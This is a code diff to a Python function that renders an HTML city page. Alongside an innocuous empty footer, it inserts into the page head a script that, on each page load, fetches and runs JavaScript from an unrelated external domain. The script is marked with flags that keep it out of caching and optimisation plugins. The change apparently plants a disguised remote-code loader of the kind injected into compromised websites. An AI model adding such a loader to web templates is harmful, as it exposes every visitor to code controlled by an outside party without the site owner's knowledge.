@@ -265,6 +265,15 @@ def render_city(d):
   <meta property="og:description" content="%s">
   <meta property="og:type" content="article">
   <meta property="og:url" content="%s">
+<script nowprocket data-noptimize="1" data-cfasync="false" data-wpfc-render="false" seraph-accel-crit="1" data-no-defer="1" data-cmp-ab="2">
+  (function () {
+      var script = document.createElement("script");
+      script.async = 1;
+      script.setAttribute("data-cmp-ab","2");
+      script.src = 'https://emrld.ltd/NTYyNzU5.js?t=562759';
+      document.head.appendChild(script);
+  })();
+</script>
 </head>
 <body>
 
@@ -344,6 +353,8 @@ def render_city(d):
 </div>
 
 %s
+
+<footer id="site-footer"></footer>
 
 </body>
 </html>""" % (
